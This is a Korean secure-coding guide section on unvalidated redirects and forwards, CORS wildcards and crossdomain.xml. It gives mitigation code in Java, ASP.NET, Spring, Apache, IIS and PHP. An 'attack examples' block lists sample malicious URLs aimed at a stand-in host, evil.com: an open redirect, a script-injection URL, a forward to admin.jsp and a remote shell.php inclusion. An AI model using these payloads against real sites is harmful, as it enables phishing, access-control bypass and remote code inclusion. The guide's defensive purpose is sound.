# 1-5. 검증되지 않은 리다이렉트와 포워드

> 악의적 사용자가 사이트에 직접 공격하지 않고도, 검증되지 않은 리다이렉트 URL을 활용하여  
> 피싱 사이트·악성코드 배포 사이트로 연결하거나, 포워드를 통해 접근 통제를 우회하는 취약점.

---

## 근본적인 원인

웹 애플리케이션이 리다이렉트/포워드 대상 URL을 사용자 입력 파라미터에서 받아 검증 없이 사용함으로써 발생:

- 리다이렉트 파라미터 미검증 → 외부 악성 사이트로 사용자 유도
- 인증 토큰 발급 시 리다이렉션 도메인 변조 → 인증 도용
- 포워드 파라미터 미검증 → 애플리케이션 접근 통제 우회
- 외부 자원을 파라미터로 사용 시 스크립트 삽입·서버 명령 실행
- CORS 설정 미흡 (`*` 허용) → 비인가 도메인의 쿠키·객체 탈취
- `crossdomain.xml` 와일드카드 설정 → Flash 기반 비인가 접근

```
공격 예제:
http://ooo.com/redirect.jsp?returl=evil.com             → 피싱 사이트로 리다이렉트
http://ooo.com/search.jsp?query=<script src="evil.com"> → XSS와 결합
http://ooo.com/forward.jsp?fwd=admin.jsp               → 접근 통제 우회
http://ooo.com/info.php?url=http://evil.com/shell.php  → 외부 자원 삽입

취약한 crossdomain.xml:
<allow-access-from domain="*"/>
```

---

## 2차 피해 시나리오

- 정상 도메인 URL로 위장한 피싱 링크 생성 → 불특정 다수에 스팸 메일·게시글 배포
- OAuth/SSO 인증 흐름에서 `redirect_uri` 변조 → 인증 코드·토큰 탈취
- 포워드 파라미터(`fwd=admin.jsp`) 조작으로 관리자 기능 직접 접근
- CORS 와일드카드로 공격자 도메인에서 인증된 사용자 API 호출
- `crossdomain.xml` `*` 설정으로 쿠키, 세션 탈취

## 해결 및 대응방안

### ① 리다이렉트 URL 화이트리스트 검증 (Java)

```java
@RequestMapping("/test/test.do")
public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) {

    String returnURL = request.getParameter("returnURL");
    String HTTP_URL  = "http://";
    String SSL_URL   = "https://";
    String[] whiteListURL = {"url1", "url2", "url3", "url4"};

    List<String> whiteListArray = new ArrayList<>();
    for (String url : whiteListURL) {
        whiteListArray.add(HTTP_URL + url);
    }

    // 프로토콜 없이 전달된 경우 http 추가
    if (!returnURL.contains(SSL_URL) && !returnURL.contains(HTTP_URL)) {
        returnURL = HTTP_URL + returnURL;
    }

    String sendURL;
    if (returnURL != null && whiteListArray.contains(returnURL)) {
        sendURL = returnURL;
    } else {
        sendURL = "http://example.co.kr";  // 기본 안전 페이지
    }

    ModelAndView mav = new ModelAndView();
    mav.setViewName("redirect:" + sendURL);
    return mav;
}
```

### ② ASP.NET: 로컬 호스트 여부 확인

```csharp
// ASP.NET MVC 3.0 이후: IsLocalUrl() 활용
public ActionResult Redirect(string returnUrl) {
    if (Url.IsLocalUrl(returnUrl)) {
        return Redirect(returnUrl);      // 동일 호스트 → 허용
    } else {
        return RedirectToAction("Index", "Home");  // 외부 → 기본 페이지
    }
}
```

### ③ XSS 필터링 동일 적용

리다이렉트 파라미터 값에 `<script>`, `javascript:` 등의 삽입이 가능하므로 1-1 항목의 HTML 인코딩·키워드 필터링을 동일하게 적용해야 함 (가이드라인 [표] 2,3 참조).

```java
// 리다이렉트 파라미터에 XSS 필터 적용
String returnUrl = xssFilter(request.getParameter("returnURL"));
```

### ④ CORS 설정: 와일드카드 금지, 화이트리스트 도메인 명시

```java
// Spring: WebMvcConfigurer CORS 설정
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("https://www.example.com", "https://app.example.com")
            // "Access-Control-Allow-Origin: *" 절대 사용 금지
            .allowedMethods("GET", "POST")
            .allowCredentials(true);
    }
}
```

```apache
# Apache httpd.conf: 정규식으로 특정 도메인만 허용
<IfModule mod_headers.c>
SetEnvIf Origin "http(s)?://(.+\.)?(0)?test\.co(m|\.kr)" AccessControlAllowOrigin=$0
Header set Access-Control-Allow-Origin %{AccessControlAllowOrigin}e env=AccessControlAllowOrigin
</IfModule>
```

```xml
<!-- ASP.NET IIS: web.config -->
<httpProtocol>
  <customHeaders>
    <add name="Access-Control-Allow-Origin"  value="http://test.com" />
    <add name="Access-Control-Allow-Methods" value="GET, POST" />
    <add name="Access-Control-Allow-Headers" value="Origin, X-Requested-With, Content-Type, Accept" />
  </customHeaders>
</httpProtocol>
```

**주의**: Origin 헤더는 클라이언트가 조작 가능하므로, Origin 헤더 단독 접근 제어는 불충분 — CSRF 토큰 등과 병행 적용.

### ⑤ crossdomain.xml: 와일드카드 제거, 특정 도메인만 허용

```xml
<!-- 취약 -->
<cross-domain-policy>
  <allow-access-from domain="*"/>
</cross-domain-policy>

<!-- 안전 -->
<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy SYSTEM
  "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
<cross-domain-policy>
  <allow-access-from domain="www.test.com"/>
  <allow-http-request-headers-from domain="www.test.com" headers="*"/>
</cross-domain-policy>
```

### ⑥ PHP: 외부 자원 참조 차단

```ini
; php.ini 설정
allow_url_fopen   = Off
allow_url_include = Off
```

부득이하게 외부 자원이 필요한 경우 `cURL`, `fsockopen` 함수를 사용하되 화이트리스트 URL만 허용.

## 보완방안

- 리다이렉트 기능이 필요 없는 페이지에서는 아예 `returnUrl` 파라미터를 받지 않도록 제거
- 포워드 대상 페이지도 서버 측에서 매핑 테이블로 관리 (파라미터로 직접 경로 전달 금지)
- OAuth `redirect_uri`는 사전에 등록된 값과 정확히 일치 여부 검증 (부분 일치 X)
- CORS 설정 후 실제 크로스오리진 요청으로 허용 도메인 외 접근 차단 여부 정기 검증
